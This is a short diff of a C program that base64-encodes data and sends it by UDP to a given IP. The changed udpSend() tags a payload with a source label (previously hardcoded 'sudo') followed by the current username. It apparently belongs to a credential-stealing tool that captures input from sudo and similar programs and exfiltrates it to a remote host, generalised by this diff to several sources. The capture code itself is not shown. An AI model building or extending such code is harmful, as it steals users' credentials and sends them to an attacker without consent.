@@ -5,6 +5,14 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <sys/wait.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <fcntl.h>
 
 char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                      'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
@@ -46,10 +54,10 @@ char* base64_encode(char* plain) {
     return b64_encoded;
 }
 
-bool udpSend(const char* msg, int port, char* dest_ip) {
+bool udpSend(const char* msg, int port, char* dest_ip, char* source) {
     struct passwd *p = getpwuid(getuid());
     char payload[100] = "";
-    strcat(payload, "sudo");
+    strcat(payload, source);
     strcat(payload, ":");
     strcat(payload, p->pw_name);
     strcat(payload, ":");
